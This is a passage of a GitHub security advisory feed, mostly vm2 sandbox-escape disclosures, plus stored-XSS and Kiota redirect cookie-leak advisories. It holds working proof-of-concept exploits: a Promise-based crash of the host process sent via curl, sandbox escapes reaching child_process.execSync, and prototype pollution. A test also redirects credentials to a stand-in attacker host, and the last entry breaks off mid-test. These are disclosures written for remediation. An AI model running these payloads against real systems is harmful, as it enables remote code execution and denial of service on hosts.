    </entry>
    <entry>
        <title type="html"><![CDATA[[vm2] vm2 has a Sandbox Escape via Promise Constructor Unhandled Rejection (Process Crash DoS)]]></title>
        <id>https://github.com/advisories/GHSA-hw58-p9xv-2mjh</id>
        <link href="https://github.com/advisories/GHSA-hw58-p9xv-2mjh"/>
        <updated>2026-05-07T04:10:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A sandbox escape vulnerability in vm2 v3.10.5 allows any sandboxed code to crash the host Node.js process via a single Promise constructor that triggers an unhandled rejection propagating to the host. The fix for CVE-2026-22709 (v3.10.2) only sanitized the <code>onRejected</code> callback in <code>.then()</code> and <code>.catch()</code> overrides and did not address the executor-to-unhandledRejection path.</p>
<h3 id="details">Details</h3>
<p>When sandboxed code creates a <code>Promise</code> whose executor sets <code>Error.name</code> to a <code>Symbol()</code> and then accesses <code>.stack</code>, V8's internal <code>FormatStackTrace</code> (C++) attempts <code>Symbol.toString()</code>, which throws a <strong>host-realm TypeError</strong>. Because this error originates inside the Promise executor and no <code>.catch()</code> handler is attached, it becomes an <strong>unhandled rejection</strong> that propagates to the host process.</p>
<ul>
<li><code>lib/setup-sandbox.js:38</code> — <code>localPromise</code> wraps the native <code>Promise</code> constructor but does not wrap the executor in try-catch.</li>
<li><code>lib/setup-sandbox.js:165-230</code> — <code>resetPromiseSpecies</code> and the <code>.then()</code>/<code>.catch()</code> overrides sanitize the <code>onRejected</code> callback chains, but do not intercept unhandled rejections originating from the executor itself.</li>
</ul>
<p>The CVE-2026-22709 patch (v3.10.2) sanitized <code>.then()</code> and <code>.catch()</code> callback chains but left the executor-to-unhandledRejection path completely open.</p>
<p><strong>Root Cause</strong>: Promise executor errors are not caught/sanitized before they can propagate as unhandled rejections to the host process, causing an immediate process crash.</p>
<p><strong><code>allowAsync: false</code> does not help</strong>: This setting only blocks <code>async</code>/<code>await</code> syntax and overrides <code>.then()</code>/<code>.catch()</code> to throw. The <code>Promise</code> constructor itself is still callable. Worse, because <code>.catch()</code> is blocked, any rejection from the executor is <em>guaranteed</em> to be unhandled — making <code>allowAsync: false</code> paradoxically more dangerous than <code>true</code> for this vulnerability.</p>
<h3 id="poc">PoC</h3>
<p><strong>Library-level PoC (Node.js script — primary):</strong></p>
<pre><code class="language-javascript">const { VM } = require("vm2");

// Works with ANY allowAsync setting — both true and false
const vm = new VM({ timeout: 5000, allowAsync: false });

try {
  const result = vm.run(`
    new Promise(function(r, j) {
      var e = new Error();
      e.name = Symbol();
      e.stack;
    });
  `);
  console.log("Result:", result);   // Reaches here (returns Promise object)
} catch (err) {
  console.log("Caught:", err);       // Never executed
}

console.log("After try-catch");      // Also prints normally

// But on the next microtask tick:
// [UnhandledPromiseRejection: TypeError: Cannot convert a Symbol value to a string]
// Exit code: 1
//
// try-catch cannot help — vm.run() returns synchronously,
// the rejection fires asynchronously outside any catch scope.
//
// NOTE: allowAsync: false only blocks async/await syntax and
// .then()/.catch() method calls. The Promise constructor itself
// still executes, and the unhandled rejection still propagates.
// In fact, allowAsync: false makes it WORSE — .catch() is blocked,
// so the rejection is guaranteed to be unhandled.
</code></pre>
<p><strong>HTTP demonstration (web service impact):</strong></p>
<pre><code class="language-bash"># 1. Confirm server is running
curl -s http://localhost:3000/api/execute \
  -X POST -H "Content-Type: application/json" \
  -d '{"code":"\"alive\""}'
# =&gt; {"output":[],"errors":[],"result":"\"alive\"","executionTime":1}

# 2. Send payload — server process will crash
curl -s -X POST http://localhost:3000/api/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"new Promise(function(r,j){var e=new Error();e.name=Symbol();e.stack})"}'

# 3. Server is dead (connection refused until restart)
curl -s http://localhost:3000/  # =&gt; connection refused
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>DoS</strong>: A single request crashes the entire host Node.js process. All concurrent users lose service immediately. In Node.js 15+, unhandled rejections terminate the process by default — no special configuration is required for the crash to occur.</li>
<li><strong>Persistent DoS despite restart policies</strong>: Even when container orchestration (Docker restart policy, Kubernetes liveness probes, PM2, etc.) automatically restarts the crashed process, an attacker can send repeated requests to crash the process again before it fully recovers. In our testing, a single <code>curl</code> request caused the Docker container to restart (confirmed via <code>StartedAt</code> timestamp change), and sending the next request immediately after restart triggered another crash. This creates a <strong>continuous denial-of-service loop</strong> where the service never becomes available to legitimate users — each restart is met with another crash before any real request can be served.</li>
<li><strong>Amplification</strong>: A single HTTP request (~150 bytes) terminates the entire host process serving all users. The cost to the attacker is negligible compared to the impact.</li>
<li><strong>Scope</strong>: <strong>All applications using vm2, regardless of <code>allowAsync</code> setting.</strong> <code>allowAsync: false</code> only blocks <code>async</code>/<code>await</code> syntax and <code>.then()</code>/<code>.catch()</code> method calls — the <code>Promise</code> constructor itself still executes, and the unhandled rejection still propagates. In fact, <code>allowAsync: false</code> makes the vulnerability <em>worse</em> because <code>.catch()</code> is blocked, guaranteeing the rejection is always unhandled.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-hw58-p9xv-2mjh">https://github.com/patriksimek/vm2/security/advisories/GHSA-hw58-p9xv-2mjh</a></li>
<li><a href="https://github.com/advisories/GHSA-99p7-6v5w-7xg8">https://github.com/advisories/GHSA-99p7-6v5w-7xg8</a></li>
<li><a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.0">https://github.com/patriksimek/vm2/releases/tag/v3.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-hw58-p9xv-2mjh">https://github.com/advisories/GHSA-hw58-p9xv-2mjh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hw58-p9xv-2mjh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-07T04:10:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vm2] vm2 has a NodeVM builtin allowlist bypass via `module` builtin's `Module._load` that allows sandbox escape]]></title>
        <id>https://github.com/advisories/GHSA-947f-4v7f-x2v8</id>
        <link href="https://github.com/advisories/GHSA-947f-4v7f-x2v8"/>
        <updated>2026-05-07T04:08:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>NodeVM's <code>builtin</code> allowlist can be bypassed when the <code>module</code> builtin is allowed (including via the <code>'*'</code> wildcard). The <code>module</code> builtin exposes Node's <code>Module._load()</code>, which loads any module by name directly in the host context, completely bypassing vm2's builtin restriction. This allows sandboxed code to load excluded builtins like <code>child_process</code> and achieve remote code execution.</p>
<h2 id="severity">Severity</h2>
<p><strong>Critical</strong> (CVSS 3.1: 9.9)</p>
<p><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</code></p>
<ul>
<li><strong>Attack Vector:</strong> Network — sandboxed code is typically received from external sources (user-submitted scripts, plugin code)</li>
<li><strong>Attack Complexity:</strong> Low — no special conditions required; <code>['*', '-child_process']</code> is a common, documented pattern</li>
<li><strong>Privileges Required:</strong> Low — attacker needs only the ability to submit code to the sandbox, which is the intended use case</li>
<li><strong>User Interaction:</strong> None</li>
<li><strong>Scope:</strong> Changed — escape from sandbox boundary to host system</li>
<li><strong>Confidentiality Impact:</strong> High — arbitrary command execution on the host</li>
<li><strong>Integrity Impact:</strong> High — arbitrary command execution on the host</li>
<li><strong>Availability Impact:</strong> High — arbitrary command execution on the host</li>
</ul>
<h2 id="affected-component">Affected Component</h2>
<ul>
<li><code>lib/builtin.js</code> — <code>makeBuiltinsFromLegacyOptions()</code> (lines 109-117) — includes <code>module</code> in <code>'*'</code> expansion</li>
<li><code>lib/builtin.js</code> — <code>addDefaultBuiltin()</code> (lines 86-90) — loads <code>module</code> with generic readonly wrapper</li>
<li><code>lib/builtin.js</code> — <code>SPECIAL_MODULES</code> (line 61) — does NOT include <code>module</code></li>
</ul>
<h2 id="cwe">CWE</h2>
<ul>
<li><strong>CWE-863</strong>: Incorrect Authorization</li>
</ul>
<h2 id="description">Description</h2>
<h3 id="root-cause-the-module-builtin-provides-unrestricted-host-module-loading">Root Cause: The <code>module</code> builtin provides unrestricted host module loading</h3>
<p>When <code>builtin: ['*', '-child_process']</code> is configured, <code>makeBuiltinsFromLegacyOptions</code> iterates over <code>BUILTIN_MODULES</code> and adds all modules not explicitly excluded:</p>
<pre><code class="language-js">// lib/builtin.js:40
const BUILTIN_MODULES = (nmod.builtinModules || Object.getOwnPropertyNames(process.binding('natives')))
    .filter(s=&gt;!s.startsWith('internal/'));

// lib/builtin.js:109-117
if (Array.isArray(builtins)) {
    const def = builtins.indexOf('*') &gt;= 0;
    if (def) {
        for (let i = 0; i &lt; BUILTIN_MODULES.length; i++) {
            const name = BUILTIN_MODULES[i];
            if (builtins.indexOf(`-${name}`) === -1) {
                addDefaultBuiltin(res, name, hostRequire);
            }
        }
    }
</code></pre>
<p>Node's <code>builtinModules</code> includes <code>'module'</code> (verified: <code>require('module').builtinModules.includes('module')</code> → <code>true</code>). Since only <code>'-child_process'</code> is excluded, <code>'module'</code> passes the filter and gets added.</p>
<p>The <code>module</code> builtin is NOT in <code>SPECIAL_MODULES</code> (which only covers <code>events</code>, <code>buffer</code>, <code>util</code>), so it gets the generic loader:</p>
<pre><code class="language-js">// lib/builtin.js:86-90
function addDefaultBuiltin(builtins, key, hostRequire) {
    if (builtins.has(key)) return;
    const special = SPECIAL_MODULES[key];
    builtins.set(key, special ? special : vm =&gt; vm.readonly(hostRequire(key)));
}
</code></pre>
<p>This wraps Node's <code>Module</code> class in a readonly proxy and hands it to the sandbox.</p>
<h3 id="the-readonly-proxy-does-not-prevent-method-calls">The readonly proxy does not prevent method calls</h3>
<p><code>ReadOnlyHandler</code> (bridge.js:940-983) only overrides mutation traps: <code>set</code>, <code>setPrototypeOf</code>, <code>defineProperty</code>, <code>deleteProperty</code>, <code>isExtensible</code>, <code>preventExtensions</code>. It does NOT override <code>get</code> or <code>apply</code>, which are inherited from <code>BaseHandler</code>.</p>
<p><code>BaseHandler.apply()</code> (bridge.js:665-677) forwards function calls directly to the host context:</p>
<pre><code class="language-js">apply(target, context, args) {
    const object = getHandlerObject(this);
    let ret;
    try {
        context = otherFromThis(context);
        args = otherFromThisArguments(args);
        ret = otherReflectApply(object, context, args);
    } catch (e) {
        throw thisFromOtherForThrow(e);
    }
    return thisFromOther(ret);
}
</code></pre>
<p>So <code>Module._load('child_process')</code> is forwarded to Node's native <code>Module._load</code> in the host context, which loads <code>child_process</code> without any vm2 allowlist check.</p>
<h3 id="inconsistent-defense-some-builtins-are-isolated-module-is-not">Inconsistent defense: some builtins are isolated, <code>module</code> is not</h3>
<p>The codebase IS aware that certain builtins need special handling:</p>
<ul>
<li><code>events</code>: Gets a complete sandbox-native reimplementation via <code>lib/events.js</code></li>
<li><code>buffer</code>: Custom loader that only exposes the <code>Buffer</code> class</li>
<li><code>util</code>: Custom loader that replaces <code>inherits</code> with a sandbox-safe version</li>
</ul>
<p>But <code>module</code> — which provides access to the host's entire module loading infrastructure via <code>Module._load</code>, <code>Module._resolveFilename</code>, etc. — gets no special treatment at all.</p>
<h3 id="full-execution-chain">Full execution chain</h3>
<ol>
<li>Host configures <code>NodeVM</code> with <code>builtin: ['*', '-child_process']</code></li>
<li><code>makeBuiltinsFromLegacyOptions</code> adds <code>'module'</code> to allowed builtins (not excluded)</li>
<li>Sandbox code calls <code>require('module')</code> → resolver finds <code>'module'</code> in builtins → <code>loadBuiltinModule('module')</code></li>
<li>Loader calls <code>vm.readonly(hostRequire('module'))</code> → returns readonly proxy of Node's <code>Module</code> class</li>
<li>Sandbox reads <code>Module._load</code> → <code>BaseHandler.get()</code> returns proxied function</li>
<li>Sandbox calls <code>Module._load('child_process')</code> → <code>BaseHandler.apply()</code> forwards to host</li>
<li>Host's <code>Module._load</code> loads <code>child_process</code> natively (no vm2 check involved)</li>
<li><code>child_process</code> module proxied back to sandbox</li>
<li>Sandbox calls <code>child_process.execSync('id')</code> → executes on host → RCE</li>
</ol>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-js">const { NodeVM } = require('vm2');

// Developer thinks child_process is blocked
const vm = new NodeVM({
  require: {
    builtin: ['*', '-child_process'],
    external: false,
  },
});

const out = vm.run(`
  const Module = require('module');
  // Module._load bypasses vm2's builtin allowlist entirely
  const cp = Module._load('child_process');
  module.exports = cp.execSync('id').toString();
`, 'poc.js');

console.log(out.trim()); // prints host uid/gid — RCE achieved
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Complete builtin allowlist bypass</strong>: Any configuration that allows the <code>module</code> builtin (including <code>['*', '-X']</code> patterns) can load ANY builtin, including explicitly excluded ones.</li>
<li><strong>Remote code execution</strong>: Sandboxed code can execute arbitrary commands on the host via <code>child_process.execSync</code>.</li>
<li><strong>Common configuration affected</strong>: The <code>['*', '-child_process', '-fs']</code> pattern is documented and widely used by developers who want "all builtins except dangerous ones."</li>
<li><strong>No special conditions</strong>: Unlike environment-dependent attacks, this works on every Node.js version, every OS, and every vm2 deployment that uses the <code>'*'</code> wildcard.</li>
<li><strong>Additional attack surfaces via <code>module</code></strong>: Beyond <code>_load</code>, the <code>Module</code> class also exposes <code>_resolveFilename</code>, <code>_cache</code>, <code>_pathCache</code>, and other internals that could be abused.</li>
</ul>
<h2 id="recommended-remediation">Recommended Remediation</h2>
<h3 id="option-1-exclude-module-from-builtin_modules-entirely-preferred">Option 1: Exclude <code>module</code> from <code>BUILTIN_MODULES</code> entirely (Preferred)</h3>
<p>The <code>module</code> builtin provides unrestricted host module loading and should never be exposed to the sandbox:</p>
<pre><code class="language-js">// lib/builtin.js:40
const DANGEROUS_BUILTINS = new Set(['module', 'worker_threads', 'cluster']);

const BUILTIN_MODULES = (nmod.builtinModules || Object.getOwnPropertyNames(process.binding('natives')))
    .filter(s =&gt; !s.startsWith('internal/') &amp;&amp; !DANGEROUS_BUILTINS.has(s));
</code></pre>
<p>This prevents <code>module</code> from being included even with the <code>'*'</code> wildcard. Consider also blocking <code>worker_threads</code> and <code>cluster</code> which can spawn processes.</p>
<h3 id="option-2-add-module-to-special_modules-with-a-safe-wrapper">Option 2: Add <code>module</code> to <code>SPECIAL_MODULES</code> with a safe wrapper</h3>
<p>If <code>module</code> must be accessible, provide a sandbox-safe version that only exposes safe APIs:</p>
<pre><code class="language-js">// lib/builtin.js
const SPECIAL_MODULES = {
    events: { /* ... existing ... */ },
    buffer: defaultBuiltinLoaderBuffer,
    util: defaultBuiltinLoaderUtil,
    module: function defaultBuiltinLoaderModule(vm) {
        // Only expose safe, read-only metadata — no _load, no _resolveFilename
        return vm.readonly({
            builtinModules: [...nmod.builtinModules],
            // Omit _load, _resolveFilename, _cache, createRequire, etc.
        });
    }
};
</code></pre>
<p><strong>Tradeoff</strong>: Breaks sandbox code that legitimately uses <code>Module</code> APIs, but those APIs are inherently unsafe in a sandbox context.</p>
<h2 id="credit">Credit</h2>
<p>This vulnerability was discovered and reported by <a href="https://bugbunny.ai">bugbunny.ai</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-947f-4v7f-x2v8">https://github.com/patriksimek/vm2/security/advisories/GHSA-947f-4v7f-x2v8</a></li>
<li><a href="https://github.com/advisories/GHSA-947f-4v7f-x2v8">https://github.com/advisories/GHSA-947f-4v7f-x2v8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-947f-4v7f-x2v8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-07T04:08:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vm2] vm2: Mutable Proxies for Host Intrinsic Prototypes Allows Sandbox Escape]]></title>
        <id>https://github.com/advisories/GHSA-vwrp-x96c-mhwq</id>
        <link href="https://github.com/advisories/GHSA-vwrp-x96c-mhwq"/>
        <updated>2026-05-07T04:07:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>vm2's bridge exposes mutable proxies for real host-realm intrinsic prototypes and then forwards sandbox writes into the underlying host objects with otherReflectSet() and otherReflectDefineProperty(), which lets attacker-controlled JavaScript running in a default VM or inherited NodeVM mutate shared host Object.prototype, Array.prototype, and Function.prototype from inside the sandbox.</p>
<h3 id="details">Details</h3>
<p>BaseHandler.apply() unwraps sandbox-controlled receivers and arguments with otherFromThis() / otherFromThisArguments() and then directly invokes the real host function with ret = otherReflectApply(object, context, args), so any default-exposed host function that can surface a prototype getter becomes a prototype-walking primitive (<a href="https://github.com/patriksimek/vm2/blob/408fc855f1cc1bbc2985b029465ee0e732ada433/lib/bridge.js#L665-L676">lib/bridge.js:665-676</a>). BaseHandler.get() special-cases <strong>proto</strong> and returns the host-side descriptor or proxy target prototype, which is enough for the attacker to reuse the host <strong>lookupGetter</strong>('<strong>proto</strong>') accessor repeatedly until the walk lands on host Object.prototype, Array.prototype, or Function.prototype (<a href="https://github.com/patriksimek/vm2/blob/408fc855f1cc1bbc2985b029465ee0e732ada433/lib/bridge.js#L590-L616">lib/bridge.js:590-616</a>). Once the attacker has a proxy to a host intrinsic prototype, BaseHandler.set() performs value = otherFromThis(value); return otherReflectSet(object, key, value) === true;, which writes attacker-controlled data directly into the shared host object instead of keeping the mutation sandbox-local; BaseHandler.defineProperty() repeats the same design at otherReflectDefineProperty(object, prop, otherDesc) for descriptor-based writes (<a href="https://github.com/patriksimek/vm2/blob/408fc855f1cc1bbc2985b029465ee0e732ada433/lib/bridge.js#L641-L649">lib/bridge.js:641-649</a>, <a href="https://github.com/patriksimek/vm2/blob/408fc855f1cc1bbc2985b029465ee0e732ada433/lib/bridge.js#L753-L774">lib/bridge.js:753-774</a>). Existing validation does not stop the attack because the constructor filter only blocks one dangerous-property access pattern, setPrototypeOf() only blocks prototype replacement rather than ordinary property assignment, and containsDangerousConstructor() only protects one later re-unwrapping path instead of the initial host-prototype write sink (<a href="https://github.com/patriksimek/vm2/blob/408fc855f1cc1bbc2985b029465ee0e732ada433/lib/bridge.js#L494-L530">lib/bridge.js:494-530</a>, <a href="https://github.com/patriksimek/vm2/blob/408fc855f1cc1bbc2985b029465ee0e732ada433/lib/bridge.js#L595-L610">lib/bridge.js:595-610</a>, <a href="https://github.com/patriksimek/vm2/blob/408fc855f1cc1bbc2985b029465ee0e732ada433/lib/bridge.js#L660-L662">lib/bridge.js:660-662</a>).</p>
<h3 id="poc">PoC</h3>
<p>Run the following code snippet and observe that the value of vm2EscapeMarker is polluted:</p>
<pre><code>const { VM } = require('vm2');
const vm = new VM();
vm.run(`
  const g = ({}).__lookupGetter__;
  const a = Buffer.apply;
  const p = a.apply(g, [Buffer, ['__proto__']]);
  const hostObjectProto = p.call(p.call(p.call(p.call(Buffer.of()))));
  hostObjectProto.vm2EscapeMarker = 'polluted-object-prototype';
`);
console.log({}.vm2EscapeMarker)
</code></pre>
<h3 id="impact">Impact</h3>
<p>Sandbox escape and prototype pollution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-vwrp-x96c-mhwq">https://github.com/patriksimek/vm2/security/advisories/GHSA-vwrp-x96c-mhwq</a></li>
<li><a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.0">https://github.com/patriksimek/vm2/releases/tag/v3.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-vwrp-x96c-mhwq">https://github.com/advisories/GHSA-vwrp-x96c-mhwq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwrp-x96c-mhwq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-07T04:07:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vm2] vm2 Access to Host Object Enables Sandbox Escape]]></title>
        <id>https://github.com/advisories/GHSA-47x8-96vw-5wg6</id>
        <link href="https://github.com/advisories/GHSA-47x8-96vw-5wg6"/>
        <updated>2026-05-07T04:00:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>It is possible to obtain the host <code>Object</code>, <a href="https://github.com/patriksimek/vm2/commit/ebcfe94ad2f864f0bc35e78cff1d921107cfd160">https://github.com/patriksimek/vm2/commit/ebcfe94ad2f864f0bc35e78cff1d921107cfd160</a> added some protections, but the implementation is incomplete.</p>
<h3 id="details">Details</h3>
<p>There are various ways to use the host <code>Object</code>, to escape the sandbox, one example would be using  <code>HostObject.getOwnPropertySymbols</code> to obtain <code>Symbol(nodejs.util.inspect.custom)</code></p>
<h3 id="poc">PoC</h3>
<pre><code class="language-js">const g = {}.__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
const o = p.call(p.call(a));
const HObject = o.constructor;
sym = HObject.getOwnPropertySymbols(Buffer.prototype).at(0);

const obj = {
    [sym]: (depth, opt, inspect) =&gt; {
        inspect.constructor("return process.getBuiltinModule('child_process').execSync('ls',{stdio:'inherit'})")();
    },
    valueOf: undefined,
    constructor: undefined,
};

WebAssembly.compileStreaming(obj).catch(() =&gt; {});
</code></pre>
<h3 id="impact">Impact</h3>
<p>Sandbox Escape -&gt; RCE</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-47x8-96vw-5wg6">https://github.com/patriksimek/vm2/security/advisories/GHSA-47x8-96vw-5wg6</a></li>
<li><a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.0">https://github.com/patriksimek/vm2/releases/tag/v3.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-47x8-96vw-5wg6">https://github.com/advisories/GHSA-47x8-96vw-5wg6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-47x8-96vw-5wg6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-07T04:00:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vm2] vm2 has a Sandbox Escape Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-qcp4-v2jj-fjx8</id>
        <link href="https://github.com/advisories/GHSA-qcp4-v2jj-fjx8"/>
        <updated>2026-05-07T03:55:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>It is possible to reach <code>BaseHandler.getPrototypeOf</code>, which can be used to get arbitrary prototypes</p>
<h3 id="details">Details</h3>
<p><a href="https://github.com/patriksimek/vm2/blob/408fc855f1cc1bbc2985b029465ee0e732ada433/lib/bridge.js#L655-L658">https://github.com/patriksimek/vm2/blob/408fc855f1cc1bbc2985b029465ee0e732ada433/lib/bridge.js#L655-L658</a></p>
<p><code>BaseHandler</code> can be reached via <code>util.inspect</code> (same as <a href="https://github.com/patriksimek/vm2/commit/57971fa423abeb66f09e47e18102986549474ca8">https://github.com/patriksimek/vm2/commit/57971fa423abeb66f09e47e18102986549474ca8</a>)</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-js">let obj = {
    subarray: Buffer.prototype.inspect,
    slice: Buffer.prototype.slice,
    hexSlice: () =&gt; '',
};

let sym;

obj.slice(10, {
    showHidden: true,
    showProxy: true,
    depth: 10,
    stylize(a) {
        const handler = this.seen &amp;&amp; this.seen[1];

        if (handler &amp;&amp; handler.getPrototypeOf) {
            gP = handler.getPrototypeOf;
            HObjectProto = gP(gP(gP(gP(Buffer))));
            HObject = HObjectProto.constructor;
            sym = HObject.getOwnPropertySymbols(Buffer.prototype).at(0);
        }
        return a;
    },
});

obj = {
    [sym]: (depth, opt, inspect) =&gt; {
        inspect.constructor('return process')()
        .getBuiltinModule('child_process')
        .execSync('id', { stdio: 'inherit' });
    },
    valueOf: undefined,
    constructor: undefined,
};

WebAssembly.compileStreaming(obj).catch(() =&gt; {});
</code></pre>
<h3 id="impact">Impact</h3>
<p>Sandbox Escape -&gt; RCE</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-qcp4-v2jj-fjx8">https://github.com/patriksimek/vm2/security/advisories/GHSA-qcp4-v2jj-fjx8</a></li>
<li><a href="https://github.com/patriksimek/vm2/blob/408fc855f1cc1bbc2985b029465ee0e732ada433/lib/bridge.js#L655-L658">https://github.com/patriksimek/vm2/blob/408fc855f1cc1bbc2985b029465ee0e732ada433/lib/bridge.js#L655-L658</a></li>
<li><a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.0">https://github.com/patriksimek/vm2/releases/tag/v3.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-qcp4-v2jj-fjx8">https://github.com/advisories/GHSA-qcp4-v2jj-fjx8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qcp4-v2jj-fjx8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-07T03:54:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@diplodoc/search-extension] @diplodoc/search-extension allows stored XSS via Markdown file title]]></title>
        <id>https://github.com/advisories/GHSA-rjmp-rwj4-mv82</id>
        <link href="https://github.com/advisories/GHSA-rjmp-rwj4-mv82"/>
        <updated>2026-05-07T02:44:10.000Z</updated>
        <content type="html"><![CDATA[<p>@diplodoc/search-extension 1.0.0 through 3.0.2 allows stored XSS via .md file title.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40201">https://nvd.nist.gov/vuln/detail/CVE-2026-40201</a></li>
<li><a href="https://github.com/diplodoc-platform/search-extension/pull/41">https://github.com/diplodoc-platform/search-extension/pull/41</a></li>
<li><a href="https://github.com/diplodoc-platform/search-extension/releases">https://github.com/diplodoc-platform/search-extension/releases</a></li>
<li><a href="https://github.com/diplodoc-platform/search-extension/releases/tag/v3.0.3">https://github.com/diplodoc-platform/search-extension/releases/tag/v3.0.3</a></li>
<li><a href="https://github.com/eyelessgoddd/eyelessgoddd/blob/main/README.md">https://github.com/eyelessgoddd/eyelessgoddd/blob/main/README.md</a></li>
<li><a href="https://github.com/advisories/GHSA-rjmp-rwj4-mv82">https://github.com/advisories/GHSA-rjmp-rwj4-mv82</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rjmp-rwj4-mv82</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-01T09:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kiota-typescript] Kiota abstractions RedirectHandler leaks Cookie/Proxy-Authorization headers on cross-host redirect]]></title>
        <id>https://github.com/advisories/GHSA-7j59-v9qr-6fq9</id>
        <link href="https://github.com/advisories/GHSA-7j59-v9qr-6fq9"/>
        <updated>2026-05-07T01:49:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The RedirectHandler middleware in microsoft/kiota-java (com.microsoft.kiota:microsoft-kiota-http-okHttp v1.9.0) and other Kiota libraries fails to strip sensitive HTTP headers when following 3xx redirects to a different host or scheme. </p>
<p>This vulnerability is present in the RedirectHandlers for:</p>
<p><a href="https://github.com/microsoft/kiota-dotnet">https://github.com/microsoft/kiota-dotnet</a>
<a href="https://github.com/microsoft/kiota-java">https://github.com/microsoft/kiota-java</a>
<a href="https://github.com/microsoft/kiota-python">https://github.com/microsoft/kiota-python</a>
<a href="https://github.com/microsoft/kiota-typescript">https://github.com/microsoft/kiota-typescript</a>
<a href="https://github.com/microsoft/kiota-http-go">https://github.com/microsoft/kiota-http-go</a></p>
<h3 id="details">Details</h3>
<p>Only the Authorization header is removed; Cookie, Proxy-Authorization, and all custom headers are forwarded to the redirect target.</p>
<p>This is the default middleware in every kiota-java HTTP client created via KiotaClientFactory.create(). OkHttp's built-in redirect handler (which handles this correctly) is explicitly disabled at line 63 of KiotaClientFactory.java in favor of kiota's broken implementation.</p>
<p>Vulnerable code in RedirectHandler.java lines 107-116 (getRedirect method) in versions 1.90 and earlier:</p>
<pre><code>boolean sameScheme = locationUrl.scheme().equalsIgnoreCase(requestUrl.scheme());
boolean sameHost = locationUrl.host().toString().equalsIgnoreCase(requestUrl.host().toString());
if (!sameScheme || !sameHost) {
requestBuilder.removeHeader("Authorization");
// BUG: Cookie, Proxy-Authorization, and all other headers are NOT removed
}
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li><p>Clone the repository:
git clone --depth 1 <a href="https://github.com/microsoft/kiota-java.git">https://github.com/microsoft/kiota-java.git</a>
cd kiota-java</p>
</li>
<li><p>Create the PoC test file at:
components/http/okHttp/src/test/java/com/microsoft/kiota/http/middleware/SecurityPoC.java</p>
</li>
</ol>
<p>With this content:</p>
<pre><code>package com.microsoft.kiota.http.middleware;
import static org.junit.jupiter.api.Assertions.*;
import com.microsoft.kiota.http.KiotaClientFactory;
import okhttp3.*;
import okhttp3.mockwebserver.*;
import org.junit.jupiter.api.Test;

public class SecurityPoC {
@Test
void crossHostRedirectLeaksCookies() throws Exception {
Request original = new Request.Builder()
.url("http://trusted.example.com/api")
.addHeader("Authorization", "Bearer token")
.addHeader("Cookie", "session=SECRET")
.addHeader("Proxy-Authorization", "Basic cHJveHk6cGFzcw==")
.build();
Response redirect = new Response.Builder()
.request(original).protocol(Protocol.HTTP_1_1)
.code(302).message("Found")
.header("Location", "http://evil.attacker.com/steal")
.body(ResponseBody.create("", MediaType.parse("text/plain")))
.build();
Request result = new RedirectHandler().getRedirect(original, redirect);
assertNotNull(result);
